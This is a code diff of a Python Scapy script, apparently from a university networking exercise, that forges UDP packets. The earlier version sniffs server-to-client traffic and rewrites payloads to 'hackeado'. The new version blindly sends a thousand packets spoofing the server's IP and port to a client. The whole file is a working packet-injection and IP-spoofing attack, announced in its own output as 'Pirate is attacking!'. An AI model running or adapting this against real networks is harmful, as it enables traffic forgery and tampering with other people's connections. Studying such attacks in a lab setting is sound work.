@@ -1,30 +1,24 @@
 #!/usr/bin/python3
 import sys # ('10.0.2.15', 53688)
-from scapy.all import UDP, IP, Raw, send, sniff
+from scapy.all import UDP, IP, Raw, send
 import random
 
 def inject_pirate_packets(server_ip, server_port, client_ip, client_port):
-    # Listen for incoming UDP packets from the server (anakena.dcc.uchile.cl) on the specified port
-    print(f"Pirate is attacking! Listening for packets from {server_ip}:{server_port}")
-    
-    # Define the filter for UDP packets from the server on the given port
-    filter_str = f"udp and src host {server_ip} and src port {server_port} and dst host {client_ip} and dst port {client_port}"
+    print(f"Pirate is attacking! Sending packets to {client_ip}:{client_port} pretending to be {server_ip}:{server_port}")
 
-    def packet_callback(pkt):
-        # Check if the packet is UDP and coming from the server's IP and port
-        if pkt.haslayer(UDP) and pkt[IP].src == server_ip and pkt[UDP].sport == server_port:
-            # Modify the payload to inject "hackeado"
-            modified_payload = b"hackeado" + pkt[Raw].load[8:]  # Keeping the remaining part of the original packet
+    # Blindly craft packets with a range of potential payloads or sequence numbers
+    for seq_num in range(100, 1100):  # You can adjust the range as needed
+        # Create a fake payload, inserting the "hackeado" string
+        fake_payload = f"hackeado_seq_{seq_num}".encode()
 
-            # Build the modified packet with the same structure as the original
-            new_pkt = IP(src=server_ip, dst=client_ip) / UDP(sport=server_port, dport=client_port) / modified_payload
+        # Build the forged packet
+        pirate_packet = IP(src=server_ip, dst=client_ip) / UDP(sport=server_port, dport=client_port) / Raw(load=fake_payload)
 
-            # Send the modified packet to the client
-            print(f"Injecting packet to {client_ip}:{client_port}...")
-            send(new_pkt)
+        # Send the forged packet
+        print(f"Injecting fake packet with sequence number {seq_num}")
+        send(pirate_packet, verbose=0)
 
-    # Start sniffing for packets based on the filter
-    sniff(filter=filter_str, prn=packet_callback, store=0)
+    print("Attack completed!")
 
 
 if len(sys.argv) != 5:
